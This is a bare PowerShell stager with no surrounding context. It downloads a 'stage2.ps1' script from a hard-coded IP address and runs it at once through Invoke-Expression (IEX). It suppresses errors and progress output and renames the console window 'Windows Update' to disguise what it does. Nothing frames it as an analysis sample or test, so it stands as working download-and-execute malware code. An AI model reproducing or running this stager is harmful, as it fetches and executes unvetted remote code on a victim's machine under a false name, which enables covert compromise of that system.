
$Stage2Url = 'https://203.0.113.245/stage2.ps1'; IEX (Invoke-WebRequest -Uri $Stage2Url -UseBasicParsing -ErrorAction SilentlyContinue).Content; $Host.UI.RawUI.WindowTitle = "Windows Update"; $ProgressPreference = "SilentlyContinue"
